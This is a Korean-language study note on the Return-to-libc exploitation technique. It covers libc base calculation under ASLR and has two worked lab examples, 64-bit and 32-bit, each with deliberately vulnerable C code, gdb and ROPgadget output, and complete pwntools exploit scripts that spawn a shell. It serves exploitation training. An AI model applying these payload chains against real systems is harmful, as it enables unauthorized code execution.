Return To Libc

# 배경
NX로 인해 공격자가 버퍼에 주입한 셸 코드를 실행하기는 어려워졌지만, 스택 버퍼 오버플로우 취약점으로 반환 주소를 덮는 것은 여전히 가능했음
실행 권한이 남아있는 코드 영역으로 반환 주소를 덮는 공격 기법을 고안

프로세스에 실행 권한이 있는 메모리 영역은 일반적으로 바이너리의 코드 영역과 바이너리가 참조하는 라이브러리의 코드 영역
리눅스에서 C언어로 작성된 프로그램이 참조하는 libc에는 `system`, `execve`등 프로세스의 실행과 관련된 함수들이 구현되어 있음


# `__libc_start_call_main`
일반적으로 사용자가 직접 호출하거나 사용하지 않는, C 프로그램의 시작점인 `main` 함수를 호출하는 데 사용되는 내부 루틴
실제로 운영 체제가 C 프로그램을 실행할 때, 실행 파일은 `_start`라는 진입점에서 실행을 시작
`_start`는 초기화를 담당하는 여러 함수를 호출한 후, 최종적으로 `__libc_start_call_main`을 통해 사용자가 정의한 `main` 함수를 호출
IDA로 분석할 때, start라는 함수를 만든 적이 없지만 항상 보였던 이유가 이런 이유

RTL기법을 사용하려면, 라이브러리 상에 있는 주소가 아니라 실제로 메모리에 올려졌을 때의 주소가 필요함
이 때, 메모리 상에 라이브러리를 그대로 적재하게게 되는데, 문제는 메모리의 시작 주소가 바뀔 수 있음([[Memory Mitigation - ASLR]])
하지만, 시작 주소만 램덤이고, 시작 주소에서 시작되는 라이브러리의 변수, 함수 등의 요소들은 항상 동일한 오프셋을 가지고 있음 
따라서 라이브러리의 시작 주소(libc_base)만 알아내면 그리고 주소를 참조할 수 있는 로직이 있다면 그 라이브러리의 대부분을 사용할 수 있게 됨

한편, `libc_start_call_main`는 main을 호출하고 main에서 ret를 하면 돌아오는 곳이기도 하기 때문에, 위에서 설명한 libc_base를 `[main 함수에서 ret로 이동하려는 주소] - [라이브러리 상에서 __libc_start_call_main 주소]`로 구할 수 있음 여기서 원하는 `system` 같은 함수에 오프셋만 더해주면 `system` 함수를 사용할 수 있게 됨


# PLT, GOT



# 예시1(64bit)
- 문제 코드
```c
#include <stdio.h>

char binsh[] = "/bin/sh";

int main(void){
    char buf[50];

    printf("BOF1\n");
    read(0, buf, 200);
    printf("%s\n", buf);
    printf("BOF2\n");
    read(0, buf, 200);

    return 0;
}
//gcc -fno-stack-protector -mpreferred-stack-boundary=4 -no-pie -fno-pie -o rtl_64 main_64.c
```

- 분석
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/rtl_64]
└─$ file rtl_64
rtl_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c5b8b8486d12582609a37f8dedda2de758ba4c32, for GNU/Linux 3.2.0, not stripped
```

```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/rtl_64]
└─$ checksec rtl_64
[*] '/home/foo1/Desktop/kknock/Pwnable/rtl_64/rtl_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

1. 64비트 아키택처임 
2. dynamic link로 되어 있으므로 .so 공유 라이브러리들을 분석할 필요가 있음
3. 리틀엔디안
4. canary 없음
5. ASLR 활성화
6. NX 활성화 - 스택, 힙 등에서 코드 실행 불가하므로 RTL, ROP 관련일 확률이 높음
7. PIE 비활성화 - 전역변수 주소는 고정 ->binsh 문자열 사용 가능

보호 기법을 고려하고, 문제 상황을 고려하면 RTL을 사용해야 함을 알 수 있음

코드를 살펴보면 크기 50짜리 버퍼를 잡는데, 64비트 아키텍처이므로 버퍼를 실제론 64바이트를 할당
```sh
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401136 <+0>:	push   rbp
   0x0000000000401137 <+1>:	mov    rbp,rsp
   0x000000000040113a <+4>:	sub    rsp,0x40
...
```

실제로 잡힌 버퍼보다 큰 값을 입력 받으므로 버퍼오버플로우 발생
따라서 첫 번째 입출력에서 main 함수의 ret주소를 leak할 수 있음

한편, 해당 바이너리에서 사용하는 공유 라이브러리의 목록을 확인해 보면 `libc.so.6`라는 라이브러리를 사용하는 것을 알 수 있음
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/rtl_64]
└─$ ldd rtl_64
	linux-vdso.so.1 (0x00007ffcbad4c000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff5a1400000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ff5a1738000)
```

해당 라이브러리에는 `system`, `__libc_start_call_main`의 대한 정의가 담겨져 있음
여기서 `__libc_start_call_main`+126에서 main함수를 호출하므로, `__libc_start_call_main`+128가 main 함수에서 `ret` 명령 실행 시 이동하는 주소임을 알 수 있음
또한 `system`의 주소가 `0x0000000000050d70`임을 알 수 있음
```sh
gef➤  disas __libc_start_call_main
Dump of assembler code for function __libc_start_call_main:
   ...
   0x0000000000029d86 <+118>:	mov    rdx,QWORD PTR [rax]
   0x0000000000029d89 <+121>:	mov    rax,QWORD PTR [rsp+0x8]
   0x0000000000029d8e <+126>:	call   rax
   0x0000000000029d90 <+128>:	mov    edi,eax
   0x0000000000029d92 <+130>:	call   0x455f0 <__GI_exit>
   0x0000000000029d97 <+135>:	call   0x915f0 <__GI___nptl_deallocate_tsd>
   ...
End of assembler dump.
gef➤  disas system
Dump of assembler code for function __libc_system:
   0x0000000000050d70 <+0>:	endbr64 
   0x0000000000050d74 <+4>:	test   rdi,rdi
   0x0000000000050d77 <+7>:	je     0x50d80 <__libc_system+16>
   0x0000000000050d79 <+9>:	jmp    0x50900 <do_system>
   ...
End of assembler dump.
gef➤  
```

하지만 첫 번째 입출력에서 main 함수의  leak한 ret주소와 `__libc_start_call_main`+128의 주소는 서로 다름
왜냐하면 전자는 실행 중 주소이고, 후자는 라이브러리 상의 주소로, 메모리에 적재되기 이전 주소이기 때문
즉, 이 정보들을 이용해 라이브러리의 시작 위치 libc_base를 계산할 수 있음

binsh은 전역변수이기 때문에 다음과 같이 구할 수 있음
```sh
gef➤  info variables 
All defined variables:

Non-debugging symbols:
...
0x0000000000404010  data_start
0x0000000000404018  __dso_handle
0x0000000000404020  binsh
0x0000000000404028  __TMC_END__
0x0000000000404028  __bss_start
0x0000000000404028  _edata
0x0000000000404028  completed
0x0000000000404030  _end
gef➤  
```

마지막으로 지금 상황에 적절한 가젯을 찾아야 하는데, `system`함수에 첫 번째 인자에 대한 설정만 해주면 되므로,
`pop rdi; ret` 형태의 가젯을 찾으면 됨(0x000000000002a3e5)
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/rtl_64]
└─$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6|grep "pop rdi"
0x00000000000ba2f4 : adc byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; pop rdi ; and byte ptr [rsi + 0xf], ah ; out dx, eax ; jmp 0x677ab268
0x00000000000ba514 : adc byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; pop rdi ; and byte ptr [rsi + 0xf], ah ; out dx, eax ; jmp 0x677ab488
0x0000000000125bea : adc esi, dword ptr [rcx + rax - 0x3d] ; xor ebp, ebp ; pop rax ; pop rdi ; call rax
0x000000000010610b : add al, ch ; pop rdi ; and dh, dl ; jmp qword ptr [rsi + 0xf]
0x0000000000162424 : add al, ch ; push rsi ; pop rdi ; in al, dx ; jmp qword ptr [rsi + 0xf]
0x00000000001723cc : add al, ch ; scasb al, byte ptr [rdi] ; pop rdi ; jmp 0x1723d1
...
0x0000000000175b44 : pop rdi ; pop r8 ; mov r14, rax ; jmp 0x175a42
0x000000000002a745 : pop rdi ; pop rbp ; ret
0x000000000002a3e5 : pop rdi ; ret
0x00000000000eb96d : pop rdi ; retf
0x000000000004c75f : pop rdi ; sbb dword ptr [rax], eax ; jmp 0x4b810
0x00000000000f79cf : pop rdi ; sete cl ; or eax, ecx ; jmp 0xf7965
0x00000000000f7b25 : pop rdi ; sete dl ; or eax, edx ; jmp 0xf7ab3
...
```

- exploit
```python
from pwn import *

p=process('./rtl_64')
#p=gdb.debug('./rtl_64')
#context.log_level='debug'

buf_size=0x40
sfp_size=0x8
binsh=0x404020

main_ret_addr=0x40119a

libc_system=0x50d70
libc_start_main=0x29d90
libc_pop_rdi_ret_gdt=0x2a3e5

payload=b''

payload+=b'a'*(buf_size+sfp_size)
p.sendafter(b'BOF1\n',payload)

p.recvuntil(payload)
libc_base=u64(p.recv(6)+b'\x00'*2)-libc_start_main

payload=b''
payload+=b'a'*(buf_size+sfp_size)
payload+=p64(libc_base+libc_pop_rdi_ret_gdt)
payload+=p64(binsh)
payload+=p64(main_ret_addr)
payload+=p64(libc_base+libc_system)

p.sendafter(b"BOF2\n",payload)

p.interactive()
```


# 예제2(32bit)

- 문제 코드
```c
#include <stdio.h>
#include <stdlib.h>

char binsh[] = "/bin/sh";

int main(void){
    char buf[50];
    printf("system addr: %p\n", &system);
    printf("binsh addr: %p\n", &binsh);

    printf("BOF\n");
    read(0, buf, 200);

    return 0;
}
```

- 분석
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/rtl_32]
└─$ file rtl_32
rtl_32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=56fe195fde6d9e46c673ded49b1acab7265ca416, for GNU/Linux 3.2.0, not stripped

┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/rtl_32]
└─$ checksec ./rtl_32
[*] '/home/foo1/Desktop/kknock/Pwnable/rtl_32/rtl_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

1. 32비트 아키택처임 
2. dynamic link로 되어 있음
3. 리틀엔디안
4. canary 없음
5. ASLR 활성화
6. NX 활성화 - 스택, 힙 등에서 코드 실행 불가하므로 RTL, ROP 관련일 확률이 높음
7. PIE 비활성화 - 전역변수 주소는 고정 ->binsh 문자열 사용 가능

동적 링킹되어 있지만 문제에서 사실상 binsh, system의 주소를 줬기 때문에 base 주소 같은 건 구할 필요가 없음

한편 이 문제에서 특이한 점이 있는데, 배열을 할당할 때 대부분 아키텍처에 따라 여유 있게 4, 8 의 배수 등으로 잡는데 이문제 에서도 32비트이므로 4의 배수로 잡음
그러나 시작 주소를 정확히 50 바이트만 할당하게 만듬
결론적으로 보통 스택 정렬을 고려하여 추가적인 공간을 할당하지만 이건 항상 필수적인 것은 아님
```sh
gef➤  disas main
Dump of assembler code for function main:
   0x08049196 <+0>:	push   ebp
   0x08049197 <+1>:	mov    ebp,esp
   0x08049199 <+3>:	sub    esp,0x34
   0x0804919c <+6>:	push   0x8049070
   0x080491a1 <+11>:	push   0x804a008
   0x080491a6 <+16>:	call   0x8049050 <printf@plt>
   0x080491ab <+21>:	add    esp,0x8
   0x080491ae <+24>:	push   0x804c01c
   0x080491b3 <+29>:	push   0x804a019
   0x080491b8 <+34>:	call   0x8049050 <printf@plt>
   0x080491bd <+39>:	add    esp,0x8
   0x080491c0 <+42>:	push   0x804a029
   0x080491c5 <+47>:	call   0x8049060 <puts@plt>
   0x080491ca <+52>:	add    esp,0x4
   0x080491cd <+55>:	push   0xc8
   0x080491d2 <+60>:	lea    eax,[ebp-0x32]
   0x080491d5 <+63>:	push   eax
   0x080491d6 <+64>:	push   0x0
   0x080491d8 <+66>:	call   0x8049040 <read@plt>
=> 0x080491dd <+71>:	add    esp,0xc
   0x080491e0 <+74>:	mov    eax,0x0
   0x080491e5 <+79>:	leave  
   0x080491e6 <+80>:	ret    
End of assembler dump.
gef➤  

```

- exploit
32bit에서는 스택으로 인자를 전달해야 하므로 아래와 같이 payload를 작성할 수 있음
여기서 2번째 sfp입력은 사실 ret를 위한 부분
```python
from pwn import *

#p=process("./rtl_32")
p=gdb.debug("./rtl_32")
context.log_level='debug'

system_addr=b''
binsh_addr=b''
payload=b''

bufsize=0x32
sfpsize=0x4

p.recvuntil("system addr: 0x")
system_addr=p32(int(p.recv(7),16))

p.recvuntil("binsh addr: 0x")
binsh_addr=p32(int(p.recv(7),16))

payload+=b'a'*(bufsize+sfpsize)
payload+=system_addr
payload+=b'a'*sfpsize
payload+=binsh_addr

p.send(payload)

p.interactive()
```


# 예제3
[[Dreamhack - Return to Library]]

